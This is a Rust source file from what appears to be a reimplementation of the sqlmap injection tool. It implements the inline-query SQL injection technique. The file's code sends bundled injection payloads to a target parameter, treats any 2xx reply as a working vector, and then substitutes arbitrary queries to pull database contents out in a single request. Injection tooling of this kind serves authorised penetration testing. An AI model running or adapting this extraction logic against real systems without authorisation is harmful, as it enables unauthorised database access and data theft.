//! Inline-query technique driver (Q).
//!
//! Substitutes the subquery's return value into the response. Rare in modern
//! apps but very powerful where it works — single-trip exfiltration like
//! UNION but with no column-count discovery.

use crate::{DetectCtx, ExtractCtx, Technique, WorkingPayload};
use async_trait::async_trait;
use sqlmap_core::dbms_kind::Dbms;
use sqlmap_core::errors::{Error, Result};
use sqlmap_core::extractor::ExtractResult;
use sqlmap_core::util::{expand_placeholders, PlaceholderCtx};
use sqlmap_payloads::{boundaries as bnd, payloads as pyl, TechniqueId};

#[derive(Debug, Default, Clone)]
pub struct InlineTechnique;

#[async_trait]
impl Technique for InlineTechnique {
    fn id(&self) -> char { 'Q' }
    fn name(&self) -> &'static str { "Inline-query" }
    fn dbms_scope(&self) -> &'static [Dbms] { &[] }

    async fn detect(&self, ctx: &mut DetectCtx<'_>) -> Result<Option<WorkingPayload>> {
        let reg = pyl::bundled();
        let boundaries = bnd::bundled();
        for boundary in boundaries.iter_for(ctx.level) {
            for payload in reg.iter_for(TechniqueId::Inline, ctx.level, ctx.risk, ctx.dbms_hint.map(|d| d.short())) {
                let ph = PlaceholderCtx::default();
                let raw = expand_placeholders(&payload.request.payload, &ph);
                let full = format!("{}{}{}", boundary.prefix, raw, boundary.suffix);
                let resp = ctx.engine.send_with_payload(ctx.target, ctx.param, &full).await?;
                // Heuristic — successful inline returns a 2xx body containing the
                // original value (vs. a 500/4xx on a broken subquery).
                if resp.status >= 200 && resp.status < 300 {
                    return Ok(Some(WorkingPayload {
                        technique: 'Q',
                        title: payload.title.clone(),
                        vector: payload.vector.clone(),
                        prefix: boundary.prefix.clone(),
                        suffix: boundary.suffix.clone(),
                        dbms: ctx.dbms_hint,
                        evidence: format!("inline ok status={}", resp.status),
                    }));
                }
            }
        }
        Ok(None)
    }

    async fn extract(&self, ctx: &mut ExtractCtx<'_>, query: &str) -> Result<ExtractResult> {
        let payload = ctx.working_vector.replace("[INFERENCE]", query);
        let full = format!("{}{}{}", ctx.working_prefix, payload, ctx.working_suffix);
        let resp = ctx.engine.send_with_payload(ctx.target, ctx.param, &full).await?;
        if resp.body.is_empty() {
            return Err(Error::ExtractionFailed { pos: 0, reason: "empty inline response".into() });
        }
        Ok(ExtractResult { data: resp.body, queries: 1, truncated: false })
    }
}
